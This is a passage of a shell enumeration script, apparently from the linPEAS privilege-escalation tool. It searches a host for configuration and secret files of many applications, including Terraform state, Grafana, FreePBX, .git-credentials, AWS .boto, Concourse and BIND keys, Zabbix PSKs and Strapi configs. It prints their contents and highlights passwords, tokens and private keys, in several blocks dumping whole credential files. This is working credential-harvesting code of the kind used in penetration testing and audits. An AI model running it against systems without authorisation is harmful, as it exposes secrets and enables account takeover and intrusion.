  4360	    if ! [ "`echo \"$PSTORAGE_ROCKETCHAT\" | grep -E \"rocketchat\.service$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "rocketchat.service"; fi; fi; printf "%s" "$PSTORAGE_ROCKETCHAT" | grep -E "rocketchat\.service$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,rocketchat\.service$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E -i "Environment" | sed -${E} "s,mongodb://.*,${SED_RED},g"; done; echo "";
  4361	fi
  4362	
  4363	
  4364	if [ "$PSTORAGE_RPCD" ] || [ "$DEBUG" ]; then
  4365	  print_2title "Analyzing Rpcd Files (limit 70)"
  4366	    if ! [ "`echo \"$PSTORAGE_RPCD\" | grep -E \"rpcd$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "rpcd"; fi; fi; printf "%s" "$PSTORAGE_RPCD" | grep -E "rpcd$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,rpcd$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.+|password.+,${SED_RED},g"; done; echo "";
  4367	fi
  4368	
  4369	
  4370	if [ "$PSTORAGE_BITCOIN" ] || [ "$DEBUG" ]; then
  4371	  print_2title "Analyzing Bitcoin Files (limit 70)"
  4372	    if ! [ "`echo \"$PSTORAGE_BITCOIN\" | grep -E \"bitcoin\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "bitcoin.conf"; fi; fi; printf "%s" "$PSTORAGE_BITCOIN" | grep -E "bitcoin\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,bitcoin\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,user=.*|password=.*|auth=.*,${SED_RED},g"; done; echo "";
  4373	fi
  4374	
  4375	
  4376	if [ "$PSTORAGE_GLUSTERFS" ] || [ "$DEBUG" ]; then
  4377	  print_2title "Analyzing GlusterFS Files (limit 70)"
  4378	    if ! [ "`echo \"$PSTORAGE_GLUSTERFS\" | grep -E \"glusterfs\.pem$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "glusterfs.pem"; fi; fi; printf "%s" "$PSTORAGE_GLUSTERFS" | grep -E "glusterfs\.pem$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,glusterfs\.pem$,${SED_RED},"; done; echo "";
  4379	    if ! [ "`echo \"$PSTORAGE_GLUSTERFS\" | grep -E \"glusterfs\.ca$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "glusterfs.ca"; fi; fi; printf "%s" "$PSTORAGE_GLUSTERFS" | grep -E "glusterfs\.ca$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,glusterfs\.ca$,${SED_RED},"; done; echo "";
  4380	    if ! [ "`echo \"$PSTORAGE_GLUSTERFS\" | grep -E \"glusterfs\.key$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "glusterfs.key"; fi; fi; printf "%s" "$PSTORAGE_GLUSTERFS" | grep -E "glusterfs\.key$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,glusterfs\.key$,${SED_RED},"; done; echo "";
  4381	fi
  4382	
  4383	
  4384	if [ "$PSTORAGE_TERRAFORM" ] || [ "$DEBUG" ]; then
  4385	  print_2title "Analyzing Terraform Files (limit 70)"
  4386	    if ! [ "`echo \"$PSTORAGE_TERRAFORM\" | grep -E \"\.tfstate$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.tfstate"; fi; fi; printf "%s" "$PSTORAGE_TERRAFORM" | grep -E "\.tfstate$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.tfstate$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,secret.*,${SED_RED},g"; done; echo "";
  4387	    if ! [ "`echo \"$PSTORAGE_TERRAFORM\" | grep -E \"\.tf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.tf"; fi; fi; printf "%s" "$PSTORAGE_TERRAFORM" | grep -E "\.tf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.tf$,${SED_RED},"; done; echo "";
  4388	fi
  4389	
  4390	
  4391	if [ "$PSTORAGE_RACOON" ] || [ "$DEBUG" ]; then
  4392	  print_2title "Analyzing Racoon Files (limit 70)"
  4393	    if ! [ "`echo \"$PSTORAGE_RACOON\" | grep -E \"racoon\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "racoon.conf"; fi; fi; printf "%s" "$PSTORAGE_RACOON" | grep -E "racoon\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,racoon\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,pre_shared_key.*,${SED_RED},g"; done; echo "";
  4394	    if ! [ "`echo \"$PSTORAGE_RACOON\" | grep -E \"psk\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "psk.txt"; fi; fi; printf "%s" "$PSTORAGE_RACOON" | grep -E "psk\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,psk\.txt$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4395	fi
  4396	
  4397	
  4398	if [ "$PSTORAGE_ROAD_RECON" ] || [ "$DEBUG" ]; then
  4399	  print_2title "Analyzing Road Recon Files (limit 70)"
  4400	    if ! [ "`echo \"$PSTORAGE_ROAD_RECON\" | grep -E \"\.roadtools_auth$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".roadtools_auth"; fi; fi; printf "%s" "$PSTORAGE_ROAD_RECON" | grep -E "\.roadtools_auth$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.roadtools_auth$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,accessToken.*,${SED_RED},g"; done; echo "";
  4401	fi
  4402	
  4403	
  4404	if [ "$PSTORAGE_GRAFANA" ] || [ "$DEBUG" ]; then
  4405	  print_2title "Analyzing Grafana Files (limit 70)"
  4406	    if ! [ "`echo \"$PSTORAGE_GRAFANA\" | grep -E \"grafana\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "grafana.ini"; fi; fi; printf "%s" "$PSTORAGE_GRAFANA" | grep -E "grafana\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,grafana\.ini$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#|^;" | sed -${E} "s,admin.*|username.*|password:*|secret.*,${SED_RED},g"; done; echo "";
  4407	fi
  4408	
  4409	
  4410	if [ "$PSTORAGE_SIP" ] || [ "$DEBUG" ]; then
  4411	  print_2title "Analyzing SIP Files (limit 70)"
  4412	    if ! [ "`echo \"$PSTORAGE_SIP\" | grep -E \"sip\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sip.conf"; fi; fi; printf "%s" "$PSTORAGE_SIP" | grep -E "sip\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sip\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,secret.*|allowguest.*=.*true,${SED_RED},g"; done; echo "";
  4413	    if ! [ "`echo \"$PSTORAGE_SIP\" | grep -E \"amportal\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "amportal.conf"; fi; fi; printf "%s" "$PSTORAGE_SIP" | grep -E "amportal\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,amportal\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*PASS.*=.*,${SED_RED},g"; done; echo "";
  4414	    if ! [ "`echo \"$PSTORAGE_SIP\" | grep -E \"FreePBX\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "FreePBX.conf"; fi; fi; printf "%s" "$PSTORAGE_SIP" | grep -E "FreePBX\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,FreePBX\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E ".*AMPDB.*=.*" | sed -${E} "s,.*AMPDB.*=.*,${SED_RED},g"; done; echo "";
  4415	    if ! [ "`echo \"$PSTORAGE_SIP\" | grep -E \"Elastix\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Elastix.conf"; fi; fi; printf "%s" "$PSTORAGE_SIP" | grep -E "Elastix\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Elastix\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*pwd.*=.*,${SED_RED},g"; done; echo "";
  4416	fi
  4417	
  4418	
  4419	if [ "$PSTORAGE_VIRTUAL_DISKS" ] || [ "$DEBUG" ]; then
  4420	  print_2title "Analyzing Virtual Disks Files (limit 70)"
  4421	    if ! [ "`echo \"$PSTORAGE_VIRTUAL_DISKS\" | grep -E \"\.vhd$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.vhd"; fi; fi; printf "%s" "$PSTORAGE_VIRTUAL_DISKS" | grep -E "\.vhd$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.vhd$,${SED_RED},"; done; echo "";
  4422	    if ! [ "`echo \"$PSTORAGE_VIRTUAL_DISKS\" | grep -E \"\.vhdx$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.vhdx"; fi; fi; printf "%s" "$PSTORAGE_VIRTUAL_DISKS" | grep -E "\.vhdx$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.vhdx$,${SED_RED},"; done; echo "";
  4423	    if ! [ "`echo \"$PSTORAGE_VIRTUAL_DISKS\" | grep -E \"\.vmdk$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.vmdk"; fi; fi; printf "%s" "$PSTORAGE_VIRTUAL_DISKS" | grep -E "\.vmdk$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.vmdk$,${SED_RED},"; done; echo "";
  4424	fi
  4425	
  4426	
  4427	if [ "$PSTORAGE_GIT" ] || [ "$DEBUG" ]; then
  4428	  print_2title "Analyzing Git Files (limit 70)"
  4429	    if ! [ "`echo \"$PSTORAGE_GIT\" | grep -E \"\.git-credentials$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".git-credentials"; fi; fi; printf "%s" "$PSTORAGE_GIT" | grep -E "\.git-credentials$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.git-credentials$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4430	fi
  4431	
  4432	
  4433	if [ "$PSTORAGE_ATLANTIS" ] || [ "$DEBUG" ]; then
  4434	  print_2title "Analyzing Atlantis Files (limit 70)"
  4435	    if ! [ "`echo \"$PSTORAGE_ATLANTIS\" | grep -E \"atlantis\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "atlantis.db"; fi; fi; printf "%s" "$PSTORAGE_ATLANTIS" | grep -E "atlantis\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,atlantis\.db$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,CloneURL|Username,${SED_RED},g"; done; echo "";
  4436	fi
  4437	
  4438	
  4439	if [ "$PSTORAGE_OPERA" ] || [ "$DEBUG" ]; then
  4440	  print_2title "Analyzing Opera Files (limit 70)"
  4441	    if ! [ "`echo \"$PSTORAGE_OPERA\" | grep -E \"com\.operasoftware\.Opera$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "com.operasoftware.Opera"; fi; fi; printf "%s" "$PSTORAGE_OPERA" | grep -E "com\.operasoftware\.Opera$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,com\.operasoftware\.Opera$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  4442	fi
  4443	
  4444	
  4445	if [ "$PSTORAGE_SAFARI" ] || [ "$DEBUG" ]; then
  4446	  print_2title "Analyzing Safari Files (limit 70)"
  4447	    if ! [ "`echo \"$PSTORAGE_SAFARI\" | grep -E \"Safari$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Safari"; fi; fi; printf "%s" "$PSTORAGE_SAFARI" | grep -E "Safari$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Safari$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  4448	fi
  4449	
  4450	
  4451	if [ "$PSTORAGE_FAT_FREE" ] || [ "$DEBUG" ]; then
  4452	  print_2title "Analyzing Fat-Free Files (limit 70)"
  4453	    if ! [ "`echo \"$PSTORAGE_FAT_FREE\" | grep -E \"fat\.config$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "fat.config"; fi; fi; printf "%s" "$PSTORAGE_FAT_FREE" | grep -E "fat\.config$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,fat\.config$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "password.*" | sed -${E} "s,password.*,${SED_RED},g"; done; echo "";
  4454	fi
  4455	
  4456	
  4457	if [ "$PSTORAGE_SHODAN" ] || [ "$DEBUG" ]; then
  4458	  print_2title "Analyzing Shodan Files (limit 70)"
  4459	    if ! [ "`echo \"$PSTORAGE_SHODAN\" | grep -E \"api_key$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "api_key"; fi; fi; printf "%s" "$PSTORAGE_SHODAN" | grep -E "api_key$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,api_key$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  4460	fi
  4461	
  4462	
  4463	if [ "$PSTORAGE_CONCOURSE" ] || [ "$DEBUG" ]; then
  4464	  print_2title "Analyzing Concourse Files (limit 70)"
  4465	    if ! [ "`echo \"$PSTORAGE_CONCOURSE\" | grep -E \"\.flyrc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".flyrc"; fi; fi; printf "%s" "$PSTORAGE_CONCOURSE" | grep -E "\.flyrc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.flyrc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,token:*|value:.*,${SED_RED},g"; done; echo "";
  4466	    if ! [ "`echo \"$PSTORAGE_CONCOURSE\" | grep -E \"concourse-auth$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "concourse-auth"; fi; fi; printf "%s" "$PSTORAGE_CONCOURSE" | grep -E "concourse-auth$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,concourse-auth$,${SED_RED},"; find "$f" -name "host-key" | while read ff; do ls -ld "$ff" | sed -${E} "s,host-key,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,RSA PRIVATE KEY,${SED_RED},g"; done; echo "";find "$f" -name "local-users" | while read ff; do ls -ld "$ff" | sed -${E} "s,local-users,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";find "$f" -name "session-signing-key" | while read ff; do ls -ld "$ff" | sed -${E} "s,session-signing-key,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";find "$f" -name "worker-key-pub" | while read ff; do ls -ld "$ff" | sed -${E} "s,worker-key-pub,${SED_RED},"; done; echo "";done; echo "";
  4467	    if ! [ "`echo \"$PSTORAGE_CONCOURSE\" | grep -E \"concourse-keys$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "concourse-keys"; fi; fi; printf "%s" "$PSTORAGE_CONCOURSE" | grep -E "concourse-keys$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,concourse-keys$,${SED_RED},"; find "$f" -name "host_key" | while read ff; do ls -ld "$ff" | sed -${E} "s,host_key,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,RSA PRIVATE KEY,${SED_RED},g"; done; echo "";find "$f" -name "session_signing_key" | while read ff; do ls -ld "$ff" | sed -${E} "s,session_signing_key,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";find "$f" -name "worker_key.pub" | while read ff; do ls -ld "$ff" | sed -${E} "s,worker_key.pub,${SED_RED},"; done; echo "";done; echo "";
  4468	fi
  4469	
  4470	
  4471	if [ "$PSTORAGE_BOTO" ] || [ "$DEBUG" ]; then
  4472	  print_2title "Analyzing Boto Files (limit 70)"
  4473	    if ! [ "`echo \"$PSTORAGE_BOTO\" | grep -E \"\.boto$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".boto"; fi; fi; printf "%s" "$PSTORAGE_BOTO" | grep -E "\.boto$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.boto$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4474	fi
  4475	
  4476	
  4477	if [ "$PSTORAGE_INFLUXDB" ] || [ "$DEBUG" ]; then
  4478	  print_2title "Analyzing InfluxDB Files (limit 70)"
  4479	    if ! [ "`echo \"$PSTORAGE_INFLUXDB\" | grep -E \"influxdb\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "influxdb.conf"; fi; fi; printf "%s" "$PSTORAGE_INFLUXDB" | grep -E "influxdb\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,influxdb\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,auth-enabled.*=.*false|token|https-private-key,${SED_RED},g"; done; echo "";
  4480	fi
  4481	
  4482	
  4483	if [ "$PSTORAGE_ZABBIX" ] || [ "$DEBUG" ]; then
  4484	  print_2title "Analyzing Zabbix Files (limit 70)"
  4485	    if ! [ "`echo \"$PSTORAGE_ZABBIX\" | grep -E \"zabbix_server\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "zabbix_server.conf"; fi; fi; printf "%s" "$PSTORAGE_ZABBIX" | grep -E "zabbix_server\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,zabbix_server\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,DBName|DBUser|DBPassword,${SED_RED},g"; done; echo "";
  4486	    if ! [ "`echo \"$PSTORAGE_ZABBIX\" | grep -E \"zabbix_agentd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "zabbix_agentd.conf"; fi; fi; printf "%s" "$PSTORAGE_ZABBIX" | grep -E "zabbix_agentd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,zabbix_agentd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,TLSPSKFile|psk,${SED_RED},g"; done; echo "";
  4487	    if ! [ "`echo \"$PSTORAGE_ZABBIX\" | grep -E \"zabbix$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "zabbix"; fi; fi; printf "%s" "$PSTORAGE_ZABBIX" | grep -E "zabbix$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,zabbix$,${SED_RED},"; find "$f" -name "*.psk" | while read ff; do ls -ld "$ff" | sed -${E} "s,.psk,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";done; echo "";
  4488	fi
  4489	
  4490	
  4491	if [ "$PSTORAGE_PRE_SHARED_KEYS" ] || [ "$DEBUG" ]; then
  4492	  print_2title "Analyzing Pre-Shared Keys Files (limit 70)"
  4493	    if ! [ "`echo \"$PSTORAGE_PRE_SHARED_KEYS\" | grep -E \"\.psk$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.psk"; fi; fi; printf "%s" "$PSTORAGE_PRE_SHARED_KEYS" | grep -E "\.psk$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.psk$,${SED_RED},"; done; echo "";
  4494	fi
  4495	
  4496	
  4497	if [ "$PSTORAGE_PASS_STORE_DIRECTORIES" ] || [ "$DEBUG" ]; then
  4498	  print_2title "Analyzing Pass Store Directories Files (limit 70)"
  4499	    if ! [ "`echo \"$PSTORAGE_PASS_STORE_DIRECTORIES\" | grep -E \"\.password-store$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".password-store"; fi; fi; printf "%s" "$PSTORAGE_PASS_STORE_DIRECTORIES" | grep -E "\.password-store$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.password-store$,${SED_RED},"; ls -lRA "$f";done; echo "";
  4500	fi
  4501	
  4502	
  4503	if [ "$PSTORAGE_SAMBA" ] || [ "$DEBUG" ]; then
  4504	  print_2title "Analyzing Samba Files (limit 70)"
  4505	    smbstatus 2>/dev/null
  4506	    if ! [ "`echo \"$PSTORAGE_SAMBA\" | grep -E \"smb\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "smb.conf"; fi; fi; printf "%s" "$PSTORAGE_SAMBA" | grep -E "smb\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,smb\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "browseable|read only|writable|guest ok|enable privileges|create mask|directory mask|logon script|magic script|magic output" | sed -${E} "s,browseable.*yes|read only.*no|writable.*yes|guest ok.*yes|enable privileges.*yes|create mask.*|directory mask.*|logon script.*|magic script.*|magic output.*,${SED_RED},g" | sed -${E} "s,browseable.*no|read only.*yes|writable.*no|guest ok.*no|enable privileges.*no,${SED_GOOD},g"; done; echo "";
  4507	fi
  4508	
  4509	
  4510	if [ "$PSTORAGE_DNS" ] || [ "$DEBUG" ]; then
  4511	  print_2title "Analyzing DNS Files (limit 70)"
  4512	    if ! [ "`echo \"$PSTORAGE_DNS\" | grep -E \"bind$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "bind"; fi; fi; printf "%s" "$PSTORAGE_DNS" | grep -E "bind$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,bind$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; done; echo "";find "$f" -name "*.key" | while read ff; do ls -ld "$ff" | sed -${E} "s,.key,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";find "$f" -name "named.conf*" | while read ff; do ls -ld "$ff" | sed -${E} "s,named.conf.*,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#|//" | sed -${E} "s,allow-query|allow-recursion|allow-transfer|zone-statistics|file .*,${SED_RED},g"; done; echo "";done; echo "";
  4513	fi
  4514	
  4515	
  4516	if [ "$PSTORAGE_SEEDDMS" ] || [ "$DEBUG" ]; then
  4517	  print_2title "Analyzing SeedDMS Files (limit 70)"
  4518	    if ! [ "`echo \"$PSTORAGE_SEEDDMS\" | grep -E \"seeddms.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "seeddms*"; fi; fi; printf "%s" "$PSTORAGE_SEEDDMS" | grep -E "seeddms.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,seeddms.*$,${SED_RED},"; find "$f" -name "settings.xml" | while read ff; do ls -ld "$ff" | sed -${E} "s,settings.xml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "=" | sed -${E} "s,[pP][aA][sS][sS],${SED_RED},g"; done; echo "";done; echo "";
  4519	fi
  4520	
  4521	
  4522	if [ "$PSTORAGE_DDCLIENT" ] || [ "$DEBUG" ]; then
  4523	  print_2title "Analyzing Ddclient Files (limit 70)"
  4524	    if ! [ "`echo \"$PSTORAGE_DDCLIENT\" | grep -E \"ddclient\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ddclient.conf"; fi; fi; printf "%s" "$PSTORAGE_DDCLIENT" | grep -E "ddclient\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ddclient\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*password.*,${SED_RED},g"; done; echo "";
  4525	fi
  4526	
  4527	
  4528	if [ "$PSTORAGE_SENTRY" ] || [ "$DEBUG" ]; then
  4529	  print_2title "Analyzing Sentry Files (limit 70)"
  4530	    if ! [ "`echo \"$PSTORAGE_SENTRY\" | grep -E \"sentry$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sentry"; fi; fi; printf "%s" "$PSTORAGE_SENTRY" | grep -E "sentry$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sentry$,${SED_RED},"; find "$f" -name "config.yml" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.yml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,*key*,${SED_RED},g"; done; echo "";done; echo "";
  4531	    if ! [ "`echo \"$PSTORAGE_SENTRY\" | grep -E \"sentry\.conf\.py$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sentry.conf.py"; fi; fi; printf "%s" "$PSTORAGE_SENTRY" | grep -E "sentry\.conf\.py$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sentry\.conf\.py$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,[pP][aA][sS][sS].*|[uU][sS][eE][rR].*,${SED_RED},g"; done; echo "";
  4532	fi
  4533	
  4534	
  4535	if [ "$PSTORAGE_STRAPI" ] || [ "$DEBUG" ]; then
  4536	  print_2title "Analyzing Strapi Files (limit 70)"
  4537	    if ! [ "`echo \"$PSTORAGE_STRAPI\" | grep -E \"environments$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "environments"; fi; fi; printf "%s" "$PSTORAGE_STRAPI" | grep -E "environments$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,environments$,${SED_RED},"; find "$f" -name "custom.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,custom.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "database.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,database.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "request.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,request.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "response.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,response.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "security.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,security.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "server.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,server.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";done; echo "";
  4538	fi
  4539	
  4540	
  4541	if [ "$PSTORAGE_CACTI" ] || [ "$DEBUG" ]; then
  4542	  print_2title "Analyzing Cacti Files (limit 70)"
  4543	    if ! [ "`echo \"$PSTORAGE_CACTI\" | grep -E \"cacti$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "cacti"; fi; fi; printf "%s" "$PSTORAGE_CACTI" | grep -E "cacti$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,cacti$,${SED_RED},"; find "$f" -name "config.php" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.php,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "database_pw|database_user|database_pass|database_type|database_default|detabase_hostname|database_port|database_ssl" | sed -${E} "s,database_pw.*|database_user.*|database_pass.*,${SED_RED},g"; done; echo "";find "$f" -name "config.php.dist" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.php.dist,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "database_pw|database_user|database_pass|database_type|database_default|detabase_hostname|database_port|database_ssl" | sed -${E} "s,database_pw.*|database_user.*|database_pass.*,${SED_RED},g"; done; echo "";find "$f" -name "installer.php" | while read ff; do ls -ld "$ff" | sed -${E} "s,installer.php,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "database_pw|database_user|database_pass|database_type|database_default|detabase_hostname|database_port|database_ssl" | sed -${E} "s,database_pw.*|database_user.*|database_pass.*,${SED_RED},g"; done; echo "";find "$f" -name "check_all_pages" | while read ff; do ls -ld "$ff" | sed -${E} "s,check_all_pages,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E 